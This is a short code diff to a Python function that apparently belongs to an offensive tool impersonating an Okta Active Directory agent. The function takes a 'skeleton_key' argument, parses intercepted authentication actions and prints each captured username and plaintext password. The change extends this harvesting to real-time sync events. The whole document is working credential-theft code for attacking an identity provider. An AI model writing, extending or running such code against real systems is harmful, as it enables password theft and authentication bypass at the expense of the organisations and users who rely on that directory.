@@ -21,11 +21,12 @@ def handleInboundAuth(okta_client, skeleton_key, action):
 
   m = re.search("<type>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
   if m:
-    if m.group(1) == "NONE":
+    action_type = m.group(1)
+    if action_type == "NONE":
       print("[*] PING Received")
       return
 
-    elif m.group(1) == "USER_AUTH":
+    elif action_type in ["USER_AUTH", "REAL_TIME_SYNC"]:
       
       user = re.search("<userName>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
       if user:
@@ -36,6 +37,10 @@ def handleInboundAuth(okta_client, skeleton_key, action):
       if pwd:
         password = pwd.group(1)
         print(f"[*] Password: {password}")
+
+      if action_type == "REAL_TIME_SYNC":
+        print ('[*] Skipping REAL_TIME_SYNC response')
+        return
 
   m = re.search("actionId=\"([^\"]+)", action_response, re.IGNORECASE + re.MULTILINE)
   if m:
